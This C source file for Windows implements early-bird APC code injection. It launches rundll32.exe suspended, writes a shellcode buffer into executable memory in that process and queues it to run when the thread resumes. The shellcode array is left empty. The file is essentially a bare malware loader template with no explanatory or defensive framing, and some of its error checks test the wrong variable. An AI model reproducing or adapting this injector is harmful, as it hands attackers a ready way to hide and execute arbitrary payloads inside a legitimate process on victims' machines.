#include<Windows.h>
#include<stdio.h>


unsigned char shellcode[] = {
	
};


void code_injection() {
	LPVOID lpBaseAddress;
	DWORD dwflag, code_size,Ret;
	BOOL bRet;
	CHAR errmsg[512];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;


	dwflag = CREATE_SUSPENDED;	// 0x4
	code_size = sizeof(shellcode);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	bRet = CreateProcessA(NULL, "rundll32.exe", NULL, NULL, FALSE, dwflag, NULL, NULL, &si, &pi);
	if (bRet == FALSE) {
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errmsg, sizeof(errmsg), NULL);
		printf("CreateProcessA : %hs\n", errmsg);
		return;
	}

	// VirtualAllocEx(pi.hProcess, NULL, 0x1000, 0x3000, 0x40)
	lpBaseAddress = VirtualAllocEx(pi.hProcess, NULL, code_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
	if (bRet == NULL) {
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errmsg, sizeof(errmsg), NULL);
		printf("VirtualAllocEx : %hs\n", errmsg);
		return;
	}

	bRet = WriteProcessMemory(pi.hProcess, lpBaseAddress, shellcode, code_size, NULL);
	if (bRet == FALSE) {
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errmsg, sizeof(errmsg), NULL);
		printf("WriteProcessMemory : %hs\n", errmsg);
		return;
	}

	Ret = QueueUserAPC((PAPCFUNC)lpBaseAddress, pi.hThread, 0);
	if (bRet == 0) {
		printf("QueueUserAPC Fatal...\n");
		return;
	}

	Ret = ResumeThread(pi.hThread);
	if (Ret == -1) {
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, errmsg, sizeof(errmsg), NULL);
		printf(" ResumeThread : %hs\n", errmsg);
		return;
	}

}